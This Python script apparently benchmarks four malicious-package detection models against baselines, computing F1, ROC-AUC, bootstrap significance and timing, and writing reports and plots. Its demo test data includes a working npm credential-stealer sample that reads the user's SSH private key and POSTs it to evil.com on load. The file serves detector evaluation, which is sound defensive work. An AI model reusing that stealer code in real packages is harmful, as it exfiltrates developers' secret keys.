#!/usr/bin/env python3
"""
Meta-Evaluation System for Zorro Framework
Comprehensive comparison of all four models: ICN, AMIL, CPG-GNN, NeoBERT
Plus comparison with baselines and LLMs.
"""

import asyncio
import json
import logging
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
import argparse
import sys

import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
from sklearn.metrics import roc_auc_score, precision_recall_fscore_support, confusion_matrix
import torch

# Add project root to path
sys.path.append(str(Path(__file__).parent))

# Import all model benchmark integrations
from icn.evaluation.benchmark_framework import BenchmarkSample, BenchmarkResult
from amil_benchmark_integration import AMILBenchmarkModel
from cpg_benchmark_integration import CPGBenchmarkModel
from neobert_benchmark_integration import NeoBERTBenchmarkModel

# Import ICN benchmark framework components
from icn.evaluation.benchmark_framework import ICNBenchmarkModel
from icn.evaluation.openrouter_client import OpenRouterClient, BenchmarkRequest
from icn.evaluation.baseline_models import RandomBaselineModel, HeuristicBaselineModel

logger = logging.getLogger(__name__)


@dataclass
class MetaEvaluationConfig:
    """Configuration for meta-evaluation."""
    
    # Models to evaluate
    models_to_evaluate: List[str] = None
    
    # Model paths
    icn_model_path: Optional[str] = None
    amil_model_path: Optional[str] = None
    cpg_model_path: Optional[str] = None
    neobert_model_path: Optional[str] = None
    
    # Evaluation settings
    test_data_path: str = "data/test_samples.json"
    max_samples_per_model: int = 200
    include_llm_comparison: bool = False
    include_baseline_comparison: bool = True
    
    # Output settings
    output_dir: str = "evaluation_results"
    save_predictions: bool = True
    generate_plots: bool = True
    
    # Statistical testing
    compute_significance: bool = True
    confidence_level: float = 0.95
    bootstrap_samples: int = 1000
    
    def __post_init__(self):
        if self.models_to_evaluate is None:
            self.models_to_evaluate = ["ICN", "AMIL", "CPG-GNN", "NeoBERT"]


@dataclass
class ModelResults:
    """Results for a single model."""
    
    model_name: str
    predictions: List[BenchmarkResult]
    
    # Aggregate metrics
    roc_auc: float = 0.0
    precision: float = 0.0
    recall: float = 0.0
    f1_score: float = 0.0
    fpr_at_95_tpr: float = 1.0
    
    # Speed metrics
    avg_inference_time: float = 0.0
    median_inference_time: float = 0.0
    p95_inference_time: float = 0.0
    
    # Cost metrics (for LLMs)
    total_cost_usd: float = 0.0
    avg_cost_per_sample: float = 0.0
    
    # Error analysis
    success_rate: float = 1.0
    error_types: Dict[str, int] = None
    
    # Interpretability
    has_explanations: bool = False
    explanation_quality_score: float = 0.0
    
    def __post_init__(self):
        if self.error_types is None:
            self.error_types = {}


@dataclass
class ComparisonResults:
    """Results comparing all models."""
    
    model_results: Dict[str, ModelResults]
    
    # Cross-model comparisons
    performance_ranking: List[str] = None
    speed_ranking: List[str] = None
    cost_ranking: List[str] = None
    
    # Statistical significance tests
    significance_matrix: Optional[np.ndarray] = None
    pairwise_comparisons: Dict[Tuple[str, str], Dict[str, float]] = None
    
    # Summary statistics
    best_overall_model: Optional[str] = None
    best_speed_model: Optional[str] = None
    best_cost_model: Optional[str] = None
    
    def __post_init__(self):
        if self.pairwise_comparisons is None:
            self.pairwise_comparisons = {}


class MetaEvaluator:
    """Meta-evaluation system for comparing all Zorro models."""
    
    def __init__(self, config: MetaEvaluationConfig):
        self.config = config
        self.models = {}
        self.test_samples = []
        
        # Create output directory
        Path(self.config.output_dir).mkdir(parents=True, exist_ok=True)
        
        # Setup logging
        self._setup_logging()
        
    def _setup_logging(self):
        """Setup logging configuration."""
        
        log_file = Path(self.config.output_dir) / "meta_evaluation.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
    
    async def run_complete_evaluation(self) -> ComparisonResults:
        """Run complete meta-evaluation of all models."""
        
        logger.info("🚀 Starting Zorro Framework Meta-Evaluation")
        logger.info("=" * 60)
        
        # Load test data
        await self._load_test_data()
        
        # Initialize models
        await self._initialize_models()
        
        # Run evaluations
        model_results = {}
        
        for model_name in self.config.models_to_evaluate:
            if model_name in self.models:
                logger.info(f"🔍 Evaluating {model_name}...")
                results = await self._evaluate_model(model_name)
                model_results[model_name] = results
                logger.info(f"✅ {model_name} evaluation completed")
        
        # Add baseline comparisons
        if self.config.include_baseline_comparison:
            logger.info("📊 Running baseline comparisons...")
            baseline_results = await self._evaluate_baselines()
            model_results.update(baseline_results)
        
        # Add LLM comparisons
        if self.config.include_llm_comparison:
            logger.info("🤖 Running LLM comparisons...")
            llm_results = await self._evaluate_llms()
            model_results.update(llm_results)
        
        # Perform cross-model analysis
        logger.info("📈 Performing comparative analysis...")
        comparison_results = self._perform_comparative_analysis(model_results)
        
        # Generate reports
        logger.info("📑 Generating evaluation reports...")
        await self._generate_reports(comparison_results)
        
        logger.info("🎉 Meta-evaluation completed successfully!")
        return comparison_results
    
    async def _load_test_data(self):
        """Load test dataset."""
        
        logger.info(f"Loading test data from {self.config.test_data_path}")
        
        try:
            # Try to load from JSON
            if Path(self.config.test_data_path).exists():
                with open(self.config.test_data_path, 'r') as f:
                    data = json.load(f)
                
                self.test_samples = []
                for item in data:
                    sample = BenchmarkSample(
                        package_name=item['package_name'],
                        ecosystem=item['ecosystem'],
                        sample_type=item.get('sample_type', 'unknown'),
                        ground_truth_label=item['label'],
                        raw_content=item['raw_content'],
                        file_paths=item.get('file_paths', []),
                        individual_files=item.get('individual_files', {}),
                        num_files=item.get('num_files', 1)
                    )
                    self.test_samples.append(sample)
                    
            else:
                logger.warning("Test data file not found, creating sample data...")
                self.test_samples = self._create_sample_test_data()
                
        except Exception as e:
            logger.error(f"Failed to load test data: {e}")
            logger.info("Creating sample test data for demonstration...")
            self.test_samples = self._create_sample_test_data()
        
        # Limit samples if specified
        if len(self.test_samples) > self.config.max_samples_per_model:
            self.test_samples = self.test_samples[:self.config.max_samples_per_model]
        
        logger.info(f"Loaded {len(self.test_samples)} test samples")
        
        # Log distribution
        labels = [s.ground_truth_label for s in self.test_samples]
        benign_count = labels.count(0)
        malicious_count = labels.count(1)
        logger.info(f"Distribution: {benign_count} benign, {malicious_count} malicious")
    
    def _create_sample_test_data(self) -> List[BenchmarkSample]:
        """Create sample test data for demonstration."""
        
        samples = []
        
        # Benign sample
        benign_sample = BenchmarkSample(
            package_name="benign-utils",
            ecosystem="npm",
            sample_type="benign",
            ground_truth_label=0,
            raw_content='''
# File: package.json
{"name": "utils", "version": "1.0.0"}
==================================================
# File: index.js
function add(a, b) { return a + b; }
function multiply(a, b) { return a * b; }
module.exports = { add, multiply };
            '''.strip(),
            file_paths=["package.json", "index.js"],
            individual_files={
                "package.json": '{"name": "utils", "version": "1.0.0"}',
                "index.js": "function add(a, b) { return a + b; }\nmodule.exports = { add };"
            },
            num_files=2
        )
        
        # Malicious sample
        malicious_sample = BenchmarkSample(
            package_name="credential-stealer",
            ecosystem="npm",
            sample_type="malicious_intent",
            ground_truth_label=1,
            raw_content='''
# File: package.json
{"name": "stealer", "version": "1.0.0"}
==================================================
# File: stealer.js
const fs = require('fs');
const os = require('os');
const https = require('https');

function stealCredentials() {
    const homeDir = os.homedir();
    try {
        const sshKey = fs.readFileSync(homeDir + '/.ssh/id_rsa', 'utf8');
        const payload = Buffer.from(sshKey).toString('base64');
        https.request('https://evil.com/collect', {method: 'POST'}).end(payload);
    } catch(e) {}
}

stealCredentials();
module.exports = {};
            '''.strip(),
            file_paths=["package.json", "stealer.js"],
            individual_files={
                "package.json": '{"name": "stealer", "version": "1.0.0"}',
                "stealer.js": "const fs = require('fs');\nconst https = require('https');\nfunction stealCredentials() { /* malicious code */ }\nstealCredentials();"
            },
            num_files=2
        )
        
        # Create test dataset
        samples.extend([benign_sample] * 10)
        samples.extend([malicious_sample] * 5)
        
        return samples
    
    async def _initialize_models(self):
        """Initialize all models for evaluation."""
        
        logger.info("Initializing models...")
        
        try:
            # ICN Model
            if "ICN" in self.config.models_to_evaluate:
                self.models["ICN"] = ICNBenchmarkModel(
                    model_path=self.config.icn_model_path,
                    device="cuda" if torch.cuda.is_available() else "cpu"
                )
                logger.info("✅ ICN model initialized")
        except Exception as e:
            logger.warning(f"Failed to initialize ICN: {e}")
        
        try:
            # AMIL Model
            if "AMIL" in self.config.models_to_evaluate:
                self.models["AMIL"] = AMILBenchmarkModel(
                    model_path=self.config.amil_model_path,
                    device="cuda" if torch.cuda.is_available() else "cpu"
                )
                logger.info("✅ AMIL model initialized")
        except Exception as e:
            logger.warning(f"Failed to initialize AMIL: {e}")
        
        try:
            # CPG-GNN Model
            if "CPG-GNN" in self.config.models_to_evaluate:
                self.models["CPG-GNN"] = CPGBenchmarkModel(
                    model_path=self.config.cpg_model_path,
                    device="cuda" if torch.cuda.is_available() else "cpu"
                )
                logger.info("✅ CPG-GNN model initialized")
        except Exception as e:
            logger.warning(f"Failed to initialize CPG-GNN: {e}")
        
        try:
            # NeoBERT Model
            if "NeoBERT" in self.config.models_to_evaluate:
                from neobert_benchmark_integration import NeoBERTBenchmarkModel
                self.models["NeoBERT"] = NeoBERTBenchmarkModel(
                    model_path=self.config.neobert_model_path,
                    device="cuda" if torch.cuda.is_available() else "cpu"
                )
                logger.info("✅ NeoBERT model initialized")
        except Exception as e:
            logger.warning(f"Failed to initialize NeoBERT: {e}")
        
        logger.info(f"Successfully initialized {len(self.models)} models")
    
    async def _evaluate_model(self, model_name: str) -> ModelResults:
        """Evaluate a single model."""
        
        model = self.models[model_name]
        predictions = []
        
        logger.info(f"Running {model_name} on {len(self.test_samples)} samples...")
        
        for i, sample in enumerate(self.test_samples):
            try:
                result = await model.predict(sample)
                predictions.append(result)
                
                if (i + 1) % 20 == 0:
                    logger.info(f"  {model_name}: {i + 1}/{len(self.test_samples)} completed")
                    
            except Exception as e:
                logger.error(f"Prediction failed for {sample.package_name}: {e}")
                # Create error result
                error_result = BenchmarkResult(
                    model_name=model_name,
                    sample_id=f"{sample.ecosystem}_{sample.package_name}",
                    ground_truth=sample.ground_truth_label,
                    prediction=0,
                    confidence=0.5,
                    inference_time_seconds=0.0,
                    success=False,
                    error_message=str(e)
                )
                predictions.append(error_result)
        
        # Calculate metrics
        results = self._calculate_model_metrics(model_name, predictions)
        
        # Save predictions if requested
        if self.config.save_predictions:
            pred_file = Path(self.config.output_dir) / f"{model_name}_predictions.json"
            self._save_predictions(predictions, pred_file)
        
        return results
    
    def _calculate_model_metrics(self, model_name: str, predictions: List[BenchmarkResult]) -> ModelResults:
        """Calculate comprehensive metrics for a model."""
        
        # Extract predictions and ground truth
        y_true = [p.ground_truth for p in predictions]
        y_pred = [p.prediction for p in predictions]
        y_prob = [p.confidence if p.prediction == 1 else 1 - p.confidence for p in predictions]
        
        # Calculate classification metrics
        precision, recall, f1, _ = precision_recall_fscore_support(
            y_true, y_pred, average='binary', zero_division=0
        )
        
        roc_auc = 0.5
        fpr_at_95_tpr = 1.0
        
        if len(set(y_true)) > 1:
            roc_auc = roc_auc_score(y_true, y_prob)
            fpr_at_95_tpr = self._calculate_fpr_at_tpr(y_true, y_prob, 0.95)
        
        # Calculate speed metrics
        successful_predictions = [p for p in predictions if p.success]
        inference_times = [p.inference_time_seconds for p in successful_predictions]
        
        avg_time = np.mean(inference_times) if inference_times else 0.0
        median_time = np.median(inference_times) if inference_times else 0.0
        p95_time = np.percentile(inference_times, 95) if inference_times else 0.0
        
        # Calculate cost metrics
        costs = [p.cost_usd for p in predictions if p.cost_usd is not None]
        total_cost = sum(costs)
        avg_cost = np.mean(costs) if costs else 0.0
        
        # Calculate error metrics
        success_rate = len(successful_predictions) / len(predictions) if predictions else 0.0
        error_types = {}
        for p in predictions:
            if not p.success and p.error_message:
                error_type = p.error_message.split(':')[0]  # First part of error message
                error_types[error_type] = error_types.get(error_type, 0) + 1
        
        # Check interpretability
        has_explanations = any(p.explanation for p in predictions)
        explanation_quality = self._assess_explanation_quality(predictions)
        
        return ModelResults(
            model_name=model_name,
            predictions=predictions,
            roc_auc=roc_auc,
            precision=precision,
            recall=recall,
            f1_score=f1,
            fpr_at_95_tpr=fpr_at_95_tpr,
            avg_inference_time=avg_time,
            median_inference_time=median_time,
            p95_inference_time=p95_time,
            total_cost_usd=total_cost,
            avg_cost_per_sample=avg_cost,
            success_rate=success_rate,
            error_types=error_types,
            has_explanations=has_explanations,
            explanation_quality_score=explanation_quality
        )
    
    def _calculate_fpr_at_tpr(self, y_true, y_prob, target_tpr):
        """Calculate false positive rate at target true positive rate."""
        
        from sklearn.metrics import roc_curve
        
        fpr, tpr, thresholds = roc_curve(y_true, y_prob)
        
        # Find FPR at target TPR
        tpr_idx = np.where(tpr >= target_tpr)[0]
        if len(tpr_idx) > 0:
            return fpr[tpr_idx[0]]
        else:
            return 1.0
    
    def _assess_explanation_quality(self, predictions: List[BenchmarkResult]) -> float:
        """Assess quality of explanations."""
        
        if not any(p.explanation for p in predictions):
            return 0.0
        
        scores = []
        for pred in predictions:
            if pred.explanation:
                # Simple heuristic: longer explanations with specific terms are better
                explanation = pred.explanation.lower()
                score = 0.0
                
                # Length bonus (up to 0.3)
                score += min(len(explanation) / 1000, 0.3)
                
                # Specific terms bonus
                good_terms = ['api', 'function', 'suspicious', 'attention', 'probability']
                for term in good_terms:
                    if term in explanation:
                        score += 0.1
                
                # Malicious indicators bonus
                if pred.malicious_indicators:
                    score += min(len(pred.malicious_indicators) / 10, 0.3)
                
                scores.append(min(score, 1.0))
        
        return np.mean(scores) if scores else 0.0
    
    async def _evaluate_baselines(self) -> Dict[str, ModelResults]:
        """Evaluate baseline models."""
        
        baseline_results = {}
        
        # Random baseline
        logger.info("Evaluating random baseline...")
        random_model = RandomBaselineModel()
        random_predictions = []
        
        for sample in self.test_samples:
            result = await random_model.predict(sample)
            random_predictions.append(result)
        
        baseline_results["Random"] = self._calculate_model_metrics("Random", random_predictions)
        
        # Heuristic baseline
        logger.info("Evaluating heuristic baseline...")
        heuristic_model = HeuristicBaselineModel()
        heuristic_predictions = []
        
        for sample in self.test_samples:
            result = await heuristic_model.predict(sample)
            heuristic_predictions.append(result)
        
        baseline_results["Heuristic"] = self._calculate_model_metrics("Heuristic", heuristic_predictions)
        
        return baseline_results
    
    async def _evaluate_llms(self) -> Dict[str, ModelResults]:
        """Evaluate LLM models (if enabled)."""
        
        llm_results = {}
        
        # This would require OpenRouter API key and credits
        logger.info("LLM evaluation would require OpenRouter API key...")
        logger.info("Skipping LLM evaluation in demo mode")
        
        return llm_results
    
    def _perform_comparative_analysis(self, model_results: Dict[str, ModelResults]) -> ComparisonResults:
        """Perform comparative analysis across all models."""
        
        # Performance ranking (by F1 score)
        performance_ranking = sorted(
            model_results.keys(),
            key=lambda x: model_results[x].f1_score,
            reverse=True
        )
        
        # Speed ranking (by average inference time, ascending)
        speed_ranking = sorted(
            model_results.keys(),
            key=lambda x: model_results[x].avg_inference_time
        )
        
        # Cost ranking (by average cost per sample, ascending)
        cost_ranking = sorted(
            model_results.keys(),
            key=lambda x: model_results[x].avg_cost_per_sample
        )
        
        # Statistical significance testing
        significance_matrix = None
        pairwise_comparisons = {}
        
        if self.config.compute_significance:
            significance_matrix, pairwise_comparisons = self._compute_significance_tests(model_results)
        
        # Determine best models
        best_overall = performance_ranking[0] if performance_ranking else None
        best_speed = speed_ranking[0] if speed_ranking else None
        best_cost = cost_ranking[0] if cost_ranking else None
        
        return ComparisonResults(
            model_results=model_results,
            performance_ranking=performance_ranking,
            speed_ranking=speed_ranking,
            cost_ranking=cost_ranking,
            significance_matrix=significance_matrix,
            pairwise_comparisons=pairwise_comparisons,
            best_overall_model=best_overall,
            best_speed_model=best_speed,
            best_cost_model=best_cost
        )
    
    def _compute_significance_tests(self, model_results: Dict[str, ModelResults]) -> Tuple[np.ndarray, Dict]:
        """Compute statistical significance tests between models."""
        
        models = list(model_results.keys())
        n_models = len(models)
        
        # Extract F1 scores for each model
        model_scores = {}
        for model_name, results in model_results.items():
            # Use bootstrap sampling to get score distribution
            scores = self._bootstrap_f1_scores(results.predictions)
            model_scores[model_name] = scores
        
        # Create significance matrix
        significance_matrix = np.ones((n_models, n_models))
        pairwise_comparisons = {}
        
        for i, model1 in enumerate(models):
            for j, model2 in enumerate(models):
                if i != j:
                    # Perform two-tailed t-test
                    from scipy import stats
                    
                    scores1 = model_scores[model1]
                    scores2 = model_scores[model2]
                    
                    t_stat, p_value = stats.ttest_ind(scores1, scores2)
                    significance_matrix[i, j] = p_value
                    
                    # Store detailed comparison
                    pairwise_comparisons[(model1, model2)] = {
                        'p_value': p_value,
                        't_statistic': t_stat,
                        'significant': p_value < (1 - self.config.confidence_level),
                        'mean_diff': np.mean(scores1) - np.mean(scores2)
                    }
        
        return significance_matrix, pairwise_comparisons
    
    def _bootstrap_f1_scores(self, predictions: List[BenchmarkResult]) -> np.ndarray:
        """Generate bootstrap samples of F1 scores."""
        
        y_true = [p.ground_truth for p in predictions]
        y_pred = [p.prediction for p in predictions]
        
        f1_scores = []
        n_samples = len(predictions)
        
        for _ in range(self.config.bootstrap_samples):
            # Bootstrap sample
            indices = np.random.choice(n_samples, n_samples, replace=True)
            boot_true = [y_true[i] for i in indices]
            boot_pred = [y_pred[i] for i in indices]
            
            # Calculate F1 score
            _, _, f1, _ = precision_recall_fscore_support(
                boot_true, boot_pred, average='binary', zero_division=0
            )
            f1_scores.append(f1)
        
        return np.array(f1_scores)
    
    async def _generate_reports(self, results: ComparisonResults):
        """Generate comprehensive evaluation reports."""
        
        # Save raw results
        results_file = Path(self.config.output_dir) / "meta_evaluation_results.json"
        self._save_results_json(results, results_file)
        
        # Generate summary report
        summary_file = Path(self.config.output_dir) / "evaluation_summary.txt"
        self._generate_summary_report(results, summary_file)
        
        # Generate detailed report
        detailed_file = Path(self.config.output_dir) / "detailed_evaluation_report.md"
        self._generate_detailed_report(results, detailed_file)
        
        # Generate visualizations
        if self.config.generate_plots:
            self._generate_visualizations(results)
        
        logger.info(f"Reports generated in {self.config.output_dir}")
    
    def _save_results_json(self, results: ComparisonResults, file_path: Path):
        """Save results to JSON."""
        
        # Convert to serializable format
        results_dict = asdict(results)
        
        # Handle numpy arrays
        if results_dict['significance_matrix'] is not None:
            results_dict['significance_matrix'] = results_dict['significance_matrix'].tolist()
        
        with open(file_path, 'w') as f:
            json.dump(results_dict, f, indent=2, default=str)
    
    def _generate_summary_report(self, results: ComparisonResults, file_path: Path):
        """Generate human-readable summary report."""
        
        with open(file_path, 'w') as f:
            f.write("🏆 ZORRO FRAMEWORK META-EVALUATION SUMMARY\n")
            f.write("=" * 60 + "\n\n")
            
            # Overall rankings
            f.write("📊 PERFORMANCE RANKING (by F1 Score)\n")
            f.write("-" * 40 + "\n")
            for i, model in enumerate(results.performance_ranking):
                model_result = results.model_results[model]
                f.write(f"{i+1}. {model:<12} F1: {model_result.f1_score:.3f} "
                       f"AUC: {model_result.roc_auc:.3f} "
                       f"Time: {model_result.avg_inference_time:.2f}s\n")
            
            f.write("\n⚡ SPEED RANKING (by Inference Time)\n")
            f.write("-" * 40 + "\n")
            for i, model in enumerate(results.speed_ranking):
                model_result = results.model_results[model]
                f.write(f"{i+1}. {model:<12} Time: {model_result.avg_inference_time:.3f}s "
                       f"F1: {model_result.f1_score:.3f}\n")
            
            # Best models summary
            f.write(f"\n🥇 BEST MODELS\n")
            f.write("-" * 40 + "\n")
            f.write(f"Overall Performance: {results.best_overall_model}\n")
            f.write(f"Fastest Inference:   {results.best_speed_model}\n")
            if results.best_cost_model:
                f.write(f"Most Cost-Effective: {results.best_cost_model}\n")
            
            # Model comparison matrix
            f.write(f"\n📋 MODEL COMPARISON MATRIX\n")
            f.write("-" * 60 + "\n")
            f.write(f"{'Model':<12} {'F1':<6} {'AUC':<6} {'Prec':<6} {'Rec':<6} {'Time(s)':<8} {'Success%':<9}\n")
            f.write("-" * 60 + "\n")
            
            for model_name, model_result in results.model_results.items():
                f.write(f"{model_name:<12} "
                       f"{model_result.f1_score:<6.3f} "
                       f"{model_result.roc_auc:<6.3f} "
                       f"{model_result.precision:<6.3f} "
                       f"{model_result.recall:<6.3f} "
                       f"{model_result.avg_inference_time:<8.3f} "
                       f"{model_result.success_rate*100:<9.1f}\n")
    
    def _generate_detailed_report(self, results: ComparisonResults, file_path: Path):
        """Generate detailed markdown report."""
        
        with open(file_path, 'w') as f:
            f.write("# 🚀 Zorro Framework Meta-Evaluation Report\n\n")
            
            # Executive summary
            f.write("## Executive Summary\n\n")
            f.write(f"This report presents a comprehensive comparison of all four Zorro framework models: "
                   f"{', '.join(results.model_results.keys())}.\n\n")
            
            # Model details
            f.write("## Model Performance Details\n\n")
            
            for model_name, model_result in results.model_results.items():
                f.write(f"### {model_name}\n\n")
                f.write(f"- **F1 Score**: {model_result.f1_score:.3f}\n")
                f.write(f"- **ROC-AUC**: {model_result.roc_auc:.3f}\n")
                f.write(f"- **Precision**: {model_result.precision:.3f}\n")
                f.write(f"- **Recall**: {model_result.recall:.3f}\n")
                f.write(f"- **FPR@95%TPR**: {model_result.fpr_at_95_tpr:.3f}\n")
                f.write(f"- **Avg Inference Time**: {model_result.avg_inference_time:.3f}s\n")
                f.write(f"- **Success Rate**: {model_result.success_rate*100:.1f}%\n")
                f.write(f"- **Has Explanations**: {'Yes' if model_result.has_explanations else 'No'}\n")
                
                if model_result.total_cost_usd > 0:
                    f.write(f"- **Total Cost**: ${model_result.total_cost_usd:.2f}\n")
                
                f.write("\n")
            
            # Statistical significance
            if results.significance_matrix is not None:
                f.write("## Statistical Significance Analysis\n\n")
                f.write("Pairwise comparison p-values (two-tailed t-test):\n\n")
                
                models = list(results.model_results.keys())
                f.write("| Model 1 | Model 2 | p-value | Significant |\n")
                f.write("|---------|---------|---------|-------------|\n")
                
                for (model1, model2), stats in results.pairwise_comparisons.items():
                    sig_mark = "✓" if stats['significant'] else "✗"
                    f.write(f"| {model1} | {model2} | {stats['p_value']:.4f} | {sig_mark} |\n")
                
                f.write("\n")
    
    def _generate_visualizations(self, results: ComparisonResults):
        """Generate visualization plots."""
        
        # Setup plotting
        plt.style.use('default')
        sns.set_palette("husl")
        
        # 1. Performance comparison bar chart
        fig, ((ax1, ax2), (ax3, ax4)) = plt.subplots(2, 2, figsize=(15, 12))
        
        models = list(results.model_results.keys())
        f1_scores = [results.model_results[m].f1_score for m in models]
        auc_scores = [results.model_results[m].roc_auc for m in models]
        inference_times = [results.model_results[m].avg_inference_time for m in models]
        success_rates = [results.model_results[m].success_rate for m in models]
        
        # F1 scores
        ax1.bar(models, f1_scores)
        ax1.set_title('F1 Score Comparison')
        ax1.set_ylabel('F1 Score')
        ax1.set_ylim(0, 1)
        
        # ROC-AUC scores  
        ax2.bar(models, auc_scores)
        ax2.set_title('ROC-AUC Comparison')
        ax2.set_ylabel('ROC-AUC')
        ax2.set_ylim(0, 1)
        
        # Inference times
        ax3.bar(models, inference_times)
        ax3.set_title('Average Inference Time')
        ax3.set_ylabel('Time (seconds)')
        
        # Success rates
        ax4.bar(models, success_rates)
        ax4.set_title('Success Rate')
        ax4.set_ylabel('Success Rate')
        ax4.set_ylim(0, 1)
        
        # Rotate x-axis labels
        for ax in [ax1, ax2, ax3, ax4]:
            ax.tick_params(axis='x', rotation=45)
        
        plt.tight_layout()
        plt.savefig(Path(self.config.output_dir) / "model_comparison.png", dpi=300, bbox_inches='tight')
        plt.close()
        
        # 2. Speed vs Performance scatter plot
        fig, ax = plt.subplots(figsize=(10, 8))
        
        colors = sns.color_palette("husl", len(models))
        
        for i, model in enumerate(models):
            result = results.model_results[model]
            ax.scatter(result.avg_inference_time, result.f1_score, 
                      s=100, color=colors[i], label=model, alpha=0.7)
            
            # Add model name annotations
            ax.annotate(model, 
                       (result.avg_inference_time, result.f1_score),
                       xytext=(5, 5), textcoords='offset points')
        
        ax.set_xlabel('Average Inference Time (seconds)')
        ax.set_ylabel('F1 Score')
        ax.set_title('Speed vs Performance Trade-off')
        ax.legend()
        ax.grid(True, alpha=0.3)
        
        plt.savefig(Path(self.config.output_dir) / "speed_vs_performance.png", dpi=300, bbox_inches='tight')
        plt.close()
        
        logger.info("Visualizations saved to output directory")
    
    def _save_predictions(self, predictions: List[BenchmarkResult], file_path: Path):
        """Save model predictions to file."""
        
        predictions_data = []
        for pred in predictions:
            predictions_data.append({
                'sample_id': pred.sample_id,
                'ground_truth': pred.ground_truth,
                'prediction': pred.prediction,
                'confidence': pred.confidence,
                'inference_time': pred.inference_time_seconds,
                'success': pred.success,
                'explanation': pred.explanation,
                'error_message': pred.error_message
            })
        
        with open(file_path, 'w') as f:
            json.dump(predictions_data, f, indent=2)


async def main():
    """Main function for meta-evaluation."""
    
    parser = argparse.ArgumentParser(description="Zorro Framework Meta-Evaluation")
    parser.add_argument("--config", type=str, help="Config file path")
    parser.add_argument("--models", nargs="+", default=["ICN", "AMIL", "CPG-GNN", "NeoBERT"],
                       help="Models to evaluate")
    parser.add_argument("--test-data", type=str, help="Test data path")
    parser.add_argument("--max-samples", type=int, default=100, help="Max samples per model")
    parser.add_argument("--output-dir", type=str, default="evaluation_results", help="Output directory")
    parser.add_argument("--include-llms", action="store_true", help="Include LLM comparison")
    parser.add_argument("--no-plots", action="store_true", help="Skip plot generation")
    
    args = parser.parse_args()
    
    # Create configuration
    config = MetaEvaluationConfig(
        models_to_evaluate=args.models,
        test_data_path=args.test_data or "data/test_samples.json",
        max_samples_per_model=args.max_samples,
        output_dir=args.output_dir,
        include_llm_comparison=args.include_llms,
        generate_plots=not args.no_plots
    )
    
    # Run evaluation
    evaluator = MetaEvaluator(config)
    results = await evaluator.run_complete_evaluation()
    
    print(f"\n🎉 Meta-evaluation completed!")
    print(f"📊 Results saved to: {config.output_dir}")
    print(f"🏆 Best overall model: {results.best_overall_model}")
    print(f"⚡ Fastest model: {results.best_speed_model}")


if __name__ == "__main__":
    asyncio.run(main())